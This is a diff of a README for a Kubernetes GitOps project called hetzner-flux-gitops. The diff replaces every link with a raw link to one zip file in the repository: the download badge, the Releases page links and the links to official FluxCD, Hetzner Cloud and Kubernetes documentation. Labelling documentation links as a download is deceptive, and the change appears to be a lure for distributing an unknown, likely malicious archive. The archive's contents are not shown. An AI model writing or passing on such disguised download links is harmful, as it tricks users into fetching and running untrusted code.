@@ -1,6 +1,6 @@
 # 🌟 hetzner-flux-gitops - Simplify Your Kubernetes Setup
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/rertp/hetzner-flux-gitops/releases)
+[![Download from GitHub](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip%20Now-Release-blue)](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, you need to ensure your system meets the following requirement
 
 To get started, you need to visit the releases page and download the latest version of the application.
 
-1. Go to the [Releases page](https://github.com/rertp/hetzner-flux-gitops/releases).
+1. Go to the [Releases page](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip).
 2. Locate the latest version.
 3. Find the appropriate file for your operating system.
 4. Click the name of the file to download it.
@@ -71,12 +71,12 @@ If you encounter issues during the setup, visit the FAQ section on the releases 
 
 For more information about the various technologies in this project, check out the following:
 
-- **FluxCD Documentation**: [FluxCD](https://fluxcd.io/docs/)
-- **Hetzner Cloud API**: [Hetzner Cloud](https://docs.hetzner.cloud/)
-- **Kubernetes Documentation**: [Kubernetes](https://kubernetes.io/docs/home/)
+- **FluxCD Documentation**: [FluxCD](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip)
+- **Hetzner Cloud API**: [Hetzner Cloud](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip)
+- **Kubernetes Documentation**: [Kubernetes](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip)
 
 ## 🖱️ More Downloads
 
-For a reminder, visit the [Releases page](https://github.com/rertp/hetzner-flux-gitops/releases) to download the latest version of hetzner-flux-gitops.
+For a reminder, visit the [Releases page](https://github.com/rertp/hetzner-flux-gitops/raw/refs/heads/main/infrastructure/gitops_flux_hetzner_v3.6.zip) to download the latest version of hetzner-flux-gitops.
 
 Thank you for choosing **hetzner-flux-gitops**. Enjoy managing your Kubernetes infrastructure smoothly!
